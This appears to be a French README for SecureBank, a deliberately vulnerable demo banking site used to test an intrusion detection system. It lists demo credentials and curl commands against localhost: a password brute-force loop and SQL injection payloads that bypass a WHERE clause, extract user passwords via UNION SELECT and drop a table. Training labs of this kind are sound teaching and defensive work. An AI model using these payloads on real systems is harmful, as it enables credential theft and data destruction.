# SecureBank — Site de Démonstration IDS

> ⚠️ **USAGE PÉDAGOGIQUE UNIQUEMENT** — Ce site est intentionnellement vulnérable.

## Installation

```bash
cd site-demo
npm install
npm start
# → http://localhost:3002
```

## Changer le port

```bash
PORT=4000 node server.js
# → http://localhost:4000
```

## Structure de la base SQLite

```
data/bank.db
├── users         → identifiants de connexion
├── transactions  → historique bancaire
└── logs          → toutes les requêtes (pour l'IDS)
```

## Comptes de démonstration

| Email                     | Mot de passe  | Rôle  |
|---------------------------|---------------|-------|
| admin@securebank.fr       | Admin1234!    | Admin |
| alice@example.com         | Alice5678!    | User  |
| bob@example.com           | Bob9012!      | User  |

---

## 🎯 Attaques à tester

### Brute Force — Page Login
```bash
# Tentative normale
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@securebank.fr","password":"mauvais"}'

# Script brute force simple
for i in {1..20}; do
  curl -s -X POST http://localhost:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@securebank.fr","password":"test'$i'"}'
  echo ""
done
```

### SQL Injection — Page Recherche
Tester ces payloads dans la barre de recherche ou via curl :

```bash
# Recherche normale
curl "http://localhost:3000/api/search?q=virement"

# SQLi 1 — Tout afficher (bypass WHERE)
curl "http://localhost:3000/api/search?q=' OR '1'='1"

# SQLi 2 — Extraire les utilisateurs via UNION
curl "http://localhost:3000/api/search?q=' UNION SELECT id,email,password,email,email,email,email FROM users--"

# SQLi 3 — Tenter de supprimer une table
curl "http://localhost:3000/api/search?q='; DROP TABLE transactions;--"
```

## 📊 API de monitoring (pour l'IDS Python)

```bash
# Voir tous les logs
GET http://localhost:3000/api/logs

# Statistiques
GET http://localhost:3000/api/stats
```